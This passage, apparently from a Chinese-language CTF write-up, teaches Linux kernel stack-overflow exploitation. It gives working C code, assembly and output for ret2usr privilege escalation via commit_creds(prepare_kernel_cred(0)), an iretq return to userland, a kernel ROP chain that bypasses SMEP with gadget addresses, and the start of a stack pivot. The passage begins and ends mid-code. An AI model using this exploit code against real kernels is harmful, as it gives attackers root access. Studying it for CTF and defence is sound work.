+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">pwned_addr</span><span class="p">;</span> <span class="c1">// ret
+</span><span class="c1"></span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="user-shellcode">User shellcode</h3>
+<p>在用户态下我们的目的往往是执行<code>system(&quot;/bin/sh&quot;)</code>等，用来获取一个<code>shell</code>。在内核中，我们已经get shell了，但是权限却只是普通用户。我们需要得到一个<code>root shell</code>，来完全控制这个系统。</p>
+<p>Linux系统下，每个进程拥有其对应的<code>struct cred</code>，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中，<code>prepare_kernel_cred()</code>创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，<code>commit_creds()</code>将这个cred应用于当前进程。此时，进程便提升到了root权限。</p>
+<p>为此，我们需要寻找这两个函数的地址。因为<code>KASLR</code>被禁用了，我们以root权限启动的内核，可以通过打开<code>/proc/kallsyms</code>，来找到所有内核函数的地址。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ <span class="c1"># cat /proc/kallsyms |grep commit_creds</span>
+ffffffff814c6410 T commit_creds
+ffffffff81f87d90 r __ksymtab_commit_creds
+ffffffff81fa0972 r __kstrtab_commit_creds
+ffffffff81fa4d42 r __kstrtabns_commit_creds
+/ <span class="c1"># cat /proc/kallsyms | grep prepare_kernel_cred</span>
+ffffffff814c67f0 T prepare_kernel_cred
+ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
+ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred
+ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred
+</code></pre></td></tr></table>
+</div>
+</div><p>这样我们就可以编写自己的shellcode了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">pwned_addr</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
+</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
+	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
+</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
+        <span class="p">...</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="return-to-userland">Return to userland</h3>
+<p>现在我们写的exp，是没有办法获得root权限的。原因是，内核态和用户态是隔离的，当我们执行shellcode时，我们还在内核态，它不会把结果给用户，它没有返回。所以，我们需要其返回用户态。</p>
+<p>这里要再讲一下，用户态与内核态之间的切换。当用户态主动进入内核时（系统调用、异常），就会陷入内核态，此时有特权级的提升，涉及到堆栈的切换。首先，要保存<code>user_ss(segment selector)</code>、<code>user_sp</code>、<code>user_flags</code>、<code>user_cs</code>、<code>user_ip</code>以及<code>err</code>等信息。在返回的时候要恢复这些寄存器的值。</p>
+<p>对于我们的shellcode，在开始之前也要先保存这些信息，以便在返回的时候让系统走正常的流程。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">,</span><span class="n">user_ss</span><span class="p">,</span><span class="n">user_sp</span><span class="p">,</span><span class="n">user_rflags</span><span class="p">,</span><span class="n">user_rip</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
+    <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov user_cs, cs;&#34;</span>
+        <span class="s">&#34;mov user_ss, ss;&#34;</span>
+        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+        <span class="s">&#34;pushf;&#34;</span>
+        <span class="s">&#34;pop user_rflags;&#34;</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>没有直接操作标志寄存器的方法，所以使用了<code>pushf</code>。另外，我们返回时需要恢复这些值，同时还要恢复<code>gs</code>的值。<code>gs</code>寄存和<code>fs</code>寄存器都是附件段的段寄存器，这些寄存器的具体作用由系统来决定，在Linux中，<code>gs</code>指向TLS结构，通过这个我们可以获取内核堆栈地址等重要信息。在返回时，我们要通过<code>swapgs</code>将其切换回用户态的<code>gs</code>。返回要使用<code>iret</code>：</p>
+<p><code>iret</code>指令会按顺序依次弹出<code>eip</code>、<code>cs</code>以及<code>eflag</code>的值到特定寄存器中，然后从新的<code>cs:ip</code>处开始执行。如果特权级发生改变，则还会在弹出<code>eflag</code>后再依次弹出<code>sp</code>与<code>ss</code>寄存器值。</p>
+<p>修改shellcode:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">pwned_addr</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
+</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
+	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
+</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
+        <span class="s">&#34;swapgs;&#34;</span>
+        <span class="s">&#34;mov r15, user_ss;&#34;</span>
+        <span class="s">&#34;push r15;&#34;</span>
+        <span class="s">&#34;mov r15, user_sp;&#34;</span>
+        <span class="s">&#34;push r15;&#34;</span>
+        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
+        <span class="s">&#34;push r15;&#34;</span>
+        <span class="s">&#34;mov r15, user_cs;&#34;</span>
+        <span class="s">&#34;push r15;&#34;</span>
+        <span class="s">&#34;mov r15, user_rip;&#34;</span>
+        <span class="s">&#34;push r15;&#34;</span>
+        <span class="s">&#34;iretq;&#34;</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>最后，我们的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">save_state</span><span class="p">();</span>
+    <span class="n">open_dev</span><span class="p">();</span>
+    <span class="n">leak</span><span class="p">();</span>
+    <span class="n">overflow</span><span class="p">();</span>  
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>result:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ $ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span>
+/ $ ./exploit 
+<span class="o">[</span>*<span class="o">]</span> Saved state
+<span class="o">[</span>*<span class="o">]</span> Opened device
+<span class="o">[</span>*<span class="o">]</span> Leaked <span class="m">160</span> bytes
+<span class="o">[</span>*<span class="o">]</span> Cookie: 6b6c612b1bbb5500
+<span class="o">[</span>*<span class="o">]</span> Prepared payload
+<span class="o">[</span>*<span class="o">]</span> Returned to userland
+<span class="o">[</span>*<span class="o">]</span> UID: 0, got root!
+/ <span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span>
+/ <span class="c1"># cat /dev/s</span>
+sda       sg0       sg1       snapshot  sr0
+/ <span class="c1"># cat /dev/sda</span>
+hxp<span class="o">{</span>t0p_d3feNSeS_Vs_1337_h@ck3rs<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="add-smepkernel-rop">Add SMEP&amp;Kernel-ROP</h2>
+<p>下面增加难度，开启<code>SMEP</code>缓解机制。在这之后，所有的用户空间页在内核态都是不可执行的。这使得我们的shellcode无法在内核态执行，<code>ret2usr</code>失效了。我们的目的依然没有变化，在内核态执行<code>commit_creds(prepare_kernel_cred(0))</code>。</p>
+<p>此时，我们有两种思路：</p>
+<ul>
+<li><code>SMEP</code>由CR4寄存器控制，我们改写CR4的第20比特，使<code>SMEP</code>失效；</li>
+<li>在内核中寻找<code>gadget</code>构造ROP链，并返回。</li>
+</ul>
+<h3 id="trying-to-overwrite-cr4">Trying to overwrite CR4</h3>
+<p>理论上，我们可以使用<code>native_write_cr4()</code>改变CR4的值，这个方法很简单直接。但是，人们也注意到了这让内核陷入无比危险的境地。所以，内核在启动时会将CR4固定，如果试图改变就会触发错误。<a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/" target="_blank" rel="noopener noreffer">a documentation on CR4 bits pinning</a></p>
+<p>这种方法不可行。</p>
+<h3 id="构造rop-chain">构造ROP chain</h3>
+<p>我们需要以下功能：</p>
+<ul>
+<li><code>prepare_kernel_cred(0)</code></li>
+<li><code>commit_creds()</code></li>
+<li><code>swapgs;ret</code></li>
+<li>恢复寄存器，<code>iretq</code></li>
+</ul>
+<p>寻找gadget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm">0xffffffff81006370 : pop rdi ; ret
+</span><span class="cm">0xffffffff8150b97e : pop rsi ; ret
+</span><span class="cm">0xffffffff81007616 : pop rdx ; ret
+</span><span class="cm">0xffffffff815f4bbc : pop rcx ; ret
+</span><span class="cm">0xffffffff81004d11 : pop rax ; ret
+</span><span class="cm">0xffffffff81006158 : pop rbx ; ret
+</span><span class="cm">0xffffffff8144591b : pop r13 ; ret
+</span><span class="cm">0xffffffff8100636d : pop r12 ; pop r15 ; ret
+</span><span class="cm">0xffffffff8100636f : pop r15 ; ret
+</span><span class="cm">
+</span><span class="cm">0xffffffff8100a55f : swapgs ; pop rbp ; ret
+</span><span class="cm">0xffffffff8100c0d9:	48 cf                	iretq
+</span><span class="cm">0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
+</span><span class="cm">0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret
+</span><span class="cm">
+</span><span class="cm">0xffffffff816bfe27 : cmp rdi, rsi ; jne 0xffffffff816bfdfa ; pop rbp ; ret
+</span><span class="cm">*/</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8150b97e</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff814c6410</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff814c67f0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_pop1_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8100a55f</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq</span> <span class="o">=</span> <span class="mh">0xffffffff8100c0d9</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166fea3</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdi_rsi_jne_pop_ret</span> <span class="o">=</span> <span class="mh">0xffffffff816bfe27</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ objdump -j .text -d ./vmlinux <span class="p">|</span> grep iretq <span class="p">|</span> head -1
+ffffffff8100c0d9:	<span class="m">48</span> cf                	iretq 
+</code></pre></td></tr></table>
+</div>
+</div><p>有时ROPgadget找到的gadget并不在可执行区，我们需要再找其他的gadget。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>         <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rdi &lt;- 0
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span> <span class="c1">// prepare_kernel_cred(0)
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span> <span class="c1">// rdi &lt;- 1
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span> <span class="c1">// rsi &lt;- 1
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdi_rsi_jne_pop_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                      <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// rdi &lt;- rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                      <span class="c1">// dummy rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                      <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>    <span class="c1">// commit_creds(prepare_kernel_cred(0))
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop_ret</span><span class="p">;</span> <span class="c1">// swapgs
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>             <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span>           <span class="c1">// iretq frame
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="stack-pivot">Stack pivot</h3>
+<p>我们再加大一些难度假设另一种情况：溢出的长度不足以写入完整的ROP链。此时，就要进行栈迁移。</p>
+<p>我们可以找到这样的gadget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="mh">0xffffffff810062dc</span> <span class="o">:</span> <span class="n">mov</span> <span class="n">rsp</span><span class="p">,</span> <span class="n">rbp</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span> <span class="p">;</span> <span class="n">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>rbp</code>在我们返回的时候就已经可以控制了，所以只要申请一块内存并控制其内容就可以了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">build_fake_stack</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">fake_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x5b000000</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdead</span><span class="p">;</span> <span class="c1">// put something in the first page to prevent fault
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span>         <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                 <span class="c1">// rdi &lt;- 0
+</span><span class="c1"></span>    <span class="n">fake_stack</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span> <span class="c1">// prepare_kernel_cred(0)
